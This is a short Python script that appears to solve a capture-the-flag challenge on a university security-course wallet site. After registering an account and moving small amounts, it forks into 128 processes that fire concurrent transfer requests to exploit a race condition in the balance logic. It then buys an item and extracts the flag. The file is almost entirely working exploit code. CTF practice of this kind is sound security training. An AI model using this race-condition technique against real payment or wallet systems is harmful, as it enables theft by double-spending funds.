import os
import re
import sys
import time
import uuid
import requests

HOST = "k17coin.unswsecurity.com"
username = 'sol_' + str(uuid.uuid4())
print(username)
cookies = {"username": username, "password": username}
pid = os.getpid()

print("init")
requests.post("http://" + HOST + "/wallet.php?action=register", data=cookies)
for i in range(1, 5):
  requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":str(i),"to":"0","amount":"100"}, cookies=cookies)

print("forking")
os.fork() # 2
os.fork() # 4
os.fork() # 8
os.fork() # 16
os.fork() # 32
os.fork() # 64
os.fork() # 128

requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":"0","to":"1","amount":"2"}, cookies=cookies)

if (os.getpid() != pid):
  sys.exit(0)

print("sleeping...")
time.sleep(10)

print("finalizing")
requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":"1","to":"0","amount":"256"}, cookies=cookies)
res = requests.post("http://" + HOST + "/wallet.php?action=buy", data={"subacc":"0", "item":"3"}, cookies=cookies).text
print(re.search("FLAG{\w*}", res).group(0))
